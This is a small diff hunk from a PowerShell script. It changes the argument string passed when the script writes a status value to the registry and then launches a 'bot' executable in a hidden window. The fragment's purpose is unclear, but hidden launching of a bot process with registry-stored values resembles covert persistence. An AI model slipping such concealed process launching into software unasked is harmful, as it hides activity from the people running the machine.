@@ -342,7 +342,7 @@ if ($storedCode -ne $null) {
               	  	}
                 if ($status -ne $null) {
         		Set-ItemProperty -Path $regPath -Name "Data" -Value $status
-	  		$combinedString = """$storedCode :: $storedData"""
+	  		$combinedString = """$storedCode :: $status"""
      			Start-Process -WindowStyle Hidden -FilePath $botpath -ArgumentList $combinedString
 			Start-Sleep 3
 		}
